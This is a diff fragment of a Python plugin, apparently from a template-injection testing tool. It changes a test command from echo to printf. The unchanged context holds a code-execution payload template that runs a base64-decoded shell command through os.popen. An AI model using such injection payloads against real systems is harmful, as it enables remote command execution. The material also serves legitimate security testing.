@@ -46,7 +46,7 @@ class Python(Plugin):
             'execute' : {
                 'call': 'evaluate',
                 'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s').decode()).read()""",
-                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                 'test_cmd_expected': rand.randstrings[2] 
             },
             'blind' : {
